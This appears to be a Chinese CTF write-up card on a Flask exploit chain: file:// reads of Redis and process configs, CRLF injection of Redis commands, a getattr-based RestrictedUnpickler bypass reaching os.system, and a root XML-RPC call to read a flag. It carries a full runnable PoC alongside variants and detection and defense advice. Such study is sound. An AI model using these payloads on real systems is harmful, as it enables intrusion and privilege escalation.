---
id: web-python-framework-flask-avatar-url-file-read-redis-crlf-pickle-root-rpc
title: Flask 头像 URL 下载全链：file:// 任意读 → Redis CRLF 提权 → RestrictedUnpickler → root XML-RPC 读 flag
type: scenario
domain: web
path: web/python/framework
technique: flask-avatar-url-file-read-redis-crlf-pickle-root-rpc
aliases:
- 头像 URL SSRF
- file:// 任意文件读取
- Redis inline CRLF 提权
- online_user pickle 注入
- RestrictedUnpickler getattr 链
- 本地 root XML-RPC 代读 flag
tags:
- flask
- ssrf
- file-read
- redis
- crlf
- pickle
- deserialization
- privilege-escalation
- xmlrpc
- ctf
cve: []
severity: critical
confidence: high
status: verified
created: '2026-11-06'
updated: '2026-11-06'
verification:
  verified_by: verifier-V155
  verified_at: '2026-11-06T07:49:05+08:00'
  notes: 已对照原文与images 41/43/45核对：urllib.request.urlopen file://读取、/etc/redis/redis.conf requirepass redispass123、Redis CRLF改role与写online_user pickle、RestrictedUnpickler放行builtins.getattr+__main__.OnlineUser、getattr→__globals__→os.system、本地root XML-RPC execute_command cat /flag→/tmp/flag_root→file://回读均与原文exp一致。未验证点：原文未附最终flag截图，未复跑；CRLF在urlopen中的可用性依赖Python/版本，卡内边界已注明。
---

## 一句话结论

已登录用户利用 `/profile/avatar` 的“从 URL 下载”功能，以 `file://` 读取 `/etc/redis/redis.conf` 与 `/proc/*/cmdline`，拿到 Redis 密码和本地 root XML-RPC 的 token/端口；再用 URL 中的原始 CRLF 把一次 HTTP 请求折叠成多条 Redis inline 命令，把自己的 role 改成 admin 并写入恶意 `online_user:*` pickle；管理员页反序列化该 pickle 时经 `builtins.getattr` + `OnlineUser.__init__.__globals__` 执行命令，调用本地 root XML-RPC `cat /flag` 写入 `/tmp/flag_root`，最后再次用 `file://` 读回。

## 原理

- **file:// 任意文件读取**：头像下载使用 `urllib.request.urlopen(url)`，没有限制 scheme。`file:///etc/redis/redis.conf`、`file:///proc/self/environ` 等都会被读取；服务端把响应字节 base64 后嵌入 `<img src="data:...;base64,...">`，即使不是图片也能从页面源码取回原文。这同时提供了读取本地配置、源码与 `/proc` 信息的能力。
- **URL 中的 CRLF → Redis inline 协议**：Flask 从表单取出 URL 后直接交给 `urllib.request.Request(url)`。攻击者在表单值里放真实 `\r\n`，Flask 解码后 URL 仍含 CRLF；`urlopen` 把它带进 HTTP 请求行/路径，发往 `127.0.0.1:6379` 时被 Redis 当作按行分隔的 inline 命令执行。于是可以 `AUTH <密码>`、`HSET user:<用户名> role admin`、`SET online_user:<用户名> "<payload>"`、`EXPIRE ...`、`QUIT`。
- **角色提升**：登录时 session 的 role 来自 Redis `user:<用户名>` 的 `role` 字段；把该字段改成 `admin` 后重新登录，session 即刷新为管理员，可访问 `/admin/online-users`。
- **RestrictedUnpickler 绕过**：管理员页遍历 `online_user:*`，对值调用自定义 `RestrictedUnpickler.load()`。允许列表包含 `__main__.OnlineUser` 和 `builtins.getattr`，因此可以构造：
  `getattr(getattr(getattr(OnlineUser, "__init__"), "__globals__").__getitem__("os"), "system")(cmd)`
  即从 `OnlineUser.__init__` 的 `__globals__` 取到模块全局字典，再取出 `os` 模块并调用 `os.system`。`getattr` 把“属性名”变成运行时可控参数，允许列表被绕过。
- **本地 root XML-RPC 代读**：Web 进程通常无权限读 `/flag`，但 `/proc/<pid>/cmdline` 里可发现以 root 运行的 `mcp_server_secure*.py`；读取该脚本可得到 `auth_token` 与监听端口。该服务暴露 `execute_command(token, "cat /flag")`，把输出写到 `/tmp/flag_root`，Web 进程再通过 `file:///tmp/flag_root` 读回，完成权限边界跨越。
- **完整链条**：任意文件读 → Redis 密码 / root 服务凭据 → Redis CRLF 改 role + 写 pickle → 管理员页反序列化 RCE → root XML-RPC 读 flag → file:// 回读。

## 触发条件

- 目标为 Flask 应用，存在已登录用户可用的“从 URL 下载/抓取”功能，且后端使用 `urllib.request.urlopen` 等未限制 scheme 的库。
- 同一主机（或可达内网）运行 Redis，且从 `redis.conf` 可读到 `requirepass`；Redis 监听 127.0.0.1 或内网地址。
- 登录逻辑从 Redis 读取 role 写入 session；管理员页对 `online_user:*` 做反序列化。
- 反序列化允许列表包含 `__main__.OnlineUser` 与 `builtins.getattr`（或同类属性访问原语）。
- 本机存在以 root 运行、可执行命令的 XML-RPC/管理服务，且其 token/端口可从可读文件或 `/proc` 获得。

## 利用步骤

1. 注册并登录普通用户，建立 session；确认 `/profile/avatar` 的“从 URL 下载”可用。
2. 用 `file:///etc/redis/redis.conf` 读取 Redis 配置，解析 `requirepass`；用 `file:///proc/<pid>/cmdline` 遍历进程，找到 `mcp_server_secure*.py` 的脚本路径。
3. 用 `file://` 读取该脚本，正则提取 `auth_token = "..."` 与端口参数；确认 `/RPC2` 上存在 `execute_command`。
4. 构造 Redis CRLF payload：`http://127.0.0.1:6379/\r\nAUTH <pass>\r\nHSET user:<用户名> role admin\r\nQUIT\r\n`，通过头像下载提交；重新登录，确认角色变为 admin。
5. 构造恶意 pickle：`getattr(getattr(getattr(__main__.OnlineUser,"__init__"),"__globals__").__getitem__("os"),"system")(shell_cmd)`；其中 `shell_cmd` 调用本地 XML-RPC：`python -c "...ServerProxy('http://127.0.0.1:<port>/RPC2').execute_command('<token>','cat /flag')..." >/tmp/flag_root 2>&1`。
6. 再用 CRLF payload 执行 `AUTH`、`SET online_user:<用户名> "<转义后的 pickle>"`、`EXPIRE online_user:<用户名> 3600`。
7. 访问 `/admin/online-users` 触发 `RestrictedUnpickler.load()`，命令执行并写入 `/tmp/flag_root`。
8. 用 `file:///tmp/flag_root` 读回内容，正则 `(?:flag|dart)\{[^}\r\n]+\}` 提取 flag。

## PoC

```python
import base64, json, re, requests

BASE = "http://target"
s = requests.Session()

# 1) 注册/登录普通用户
user, pwd = "u12345678", "Aa123456!"
s.post(BASE + "/register", data={"username": user, "password": pwd,
                                 "confirm_password": pwd, "name": "x", "age": "1", "phone": "1"})
s.post(BASE + "/login", data={"username": user, "password": pwd}, allow_redirects=False)

def fetch(url):
    html = s.post(BASE + "/profile/avatar",
                  data={"upload_type": "从URL下载", "avatar_url": url}).text
    m = re.search(r'src="data:([^;]*);base64,([A-Za-z0-9+/=]*)"', html)
    return base64.b64decode(m.group(2)) if m else None

# 2) 任意文件读取
redis_conf = fetch("file:///etc/redis/redis.conf").decode()
redis_pass = re.search(r"(?m)^requirepass\s+(\S+)", redis_conf).group(1)

rpc_path = None
for pid in range(1, 256):
    data = fetch(f"file:///proc/{pid}/cmdline")
    if data and b"mcp_server_secure" in data:
        for part in data.split(b"\x00"):
            if b"mcp_server_secure" in part and part.endswith(b".py"):
                rpc_path = part.decode()
                break
rpc_src = fetch("file://" + rpc_path).decode()
token = re.search(r'auth_token\s*=\s*"([^"]+)"', rpc_src).group(1)
port = int(re.search(r"port=(\d+)", rpc_src).group(1))

# 3) Redis CRLF：改 role
redis_cmd = f"http://127.0.0.1:6379/\r\nAUTH {redis_pass}\r\nHSET user:{user} role admin\r\nQUIT\r\n"
fetch(redis_cmd)
s.post(BASE + "/login", data={"username": user, "password": pwd}, allow_redirects=False)

# 4) 构造 getattr -> __globals__ -> os.system 的 pickle
def pystr(x): return "'" + x.replace("\\", "\\\\").replace("'", "\\'") + "'"
def g(mod, name): return f"c{mod}\n{name}\n"
def call(fn, args): return fn + "(" + "".join(args) + "tR"
chain = call(g("builtins", "getattr"), [
    call(g("builtins", "getattr"), [
        call(g("builtins", "getattr"), [g("__main__", "OnlineUser"), f"S{pystr('__init__')}\n"]),
        f"S{pystr('__globals__')}\n"]),
    f"S{pystr('__getitem__')}\n"])
chain = call(chain, [f"S{pystr('os')}\n"])
chain = call(g("builtins", "getattr"), [chain, f"S{pystr('system')}\n"])
cmd = (f"python -c \"import xmlrpc.client,sys;"
       f"s=xmlrpc.client.ServerProxy('http://127.0.0.1:{port}/RPC2');"
       f"r=s.execute_command('{token}','cat /flag');"
       f"sys.stdout.write((r.get('stdout') or '')+(r.get('stderr') or ''))\" "
       f">/tmp/flag_root 2>&1")
payload = call(chain, [f"S{pystr(cmd)}\n"]) + "."

def redis_inline_escape(b):
    out = []
    for x in b:
        c = chr(x)
        out.append({"\\": "\\\\", '"': '\\"', "\n": "\\n", "\r": "\\r"}.get(c)
                   or (c if 32 <= x <= 126 else f"\\x{x:02x}"))
    return "".join(out)

redis_cmd = (f"http://127.0.0.1:6379/\r\nAUTH {redis_pass}\r\n"
             f'SET online_user:{user} "{redis_inline_escape(payload.encode())}"\r\n'
             f"EXPIRE online_user:{user} 3600\r\nQUIT\r\n")
fetch(redis_cmd)

# 5) 触发反序列化并回读 flag
s.get(BASE + "/admin/online-users")
flag = fetch("file:///tmp/flag_root").decode()
print(re.search(r"(?:flag|dart)\{[^}\r\n]+\}", flag, re.I).group(0))
```

## 变体与关联

- 变体：若 `urlopen` 不支持 `file://`，改用 `gopher://`/`dict://` 直接构造 Redis RESP；若只允许 http/https，可用内网 SSRF 跳板或 CRLF 继续打 Redis。
- 变体：Redis 未设密码时去掉 `AUTH`；inline 协议被禁用/受限时改用 RESP 多 bulk 数组（需 gopher 或原始 socket）。
- 变体：pickle 允许列表若不放行 `builtins.getattr`，可尝试 `operator.attrgetter`、`functools.partial`、`builtins.__dict__.__getitem__` 等同类属性访问原语；若只允许业务类，需寻找类上的 `__reduce__`/`__setstate__` 可达路径。
- 变体：本地 root 服务不一定是 XML-RPC；也可能是 Unix socket 管理接口、Docker socket、systemd 或任务队列，读取 `/proc`/配置拿到调用方式后可替换最后一跳。
- 关联：[[web-python-deserialization-restricted-unpickler-getattr-bypass]]（getattr 绕过 find_class 的通用原理）、[[web-generic-ssrf-redis-inline-protocol-crlf]]（SSRF 打 Redis 的协议细节）、[[web-python-framework-flask-static-folder-arbitrary-file-read]]（Flask 任意文件读取的另一种入口）。
- 边界：文章为 CTF 题解，exp 完整但未附最终 flag 截图；实际环境需处理 Redis 版本对 inline 引号/`\xNN` 转义的支持、Flask 表单对 CRLF 的编码，以及 `/proc` 遍历权限。

## 检测与防御

- 检测：头像/远程抓取接口出现 `file://`、`gopher://`、`dict://` 或 URL 中含 `%0D%0A`/裸 CRLF；Redis 日志出现来自 Web 进程的 `AUTH`/`HSET user:* role`/`SET online_user:*`；管理员页反序列化请求与异常 `os.system`/`subprocess` 子进程；Web 进程访问 `/tmp/flag_root` 或本地管理端口。
- 修复：远程抓取只允许 `http/https` 并做域名/IP 允许列表，禁止回环与内网；对 URL 做 CRLF/控制字符过滤；不要用 `pickle` 存储 `online_user`，改用 JSON/签名 token；`RestrictedUnpickler` 不要放行 `getattr`/`setattr`/`builtins` 等属性访问原语。
- 加固：Redis 设置强密码、`bind 127.0.0.1`、开启 `protected-mode`，禁止 Web 进程直连；本地 root 服务使用独立 Unix socket/鉴权并限制调用方；Web 进程降权，`/flag` 仅 root 可读。
- 防御：把“可读配置文件 + 本地管理服务”视为同一条提权链；对 `/proc/*/cmdline` 的批量读取、异常 URL scheme、管理员页反序列化行为做告警。
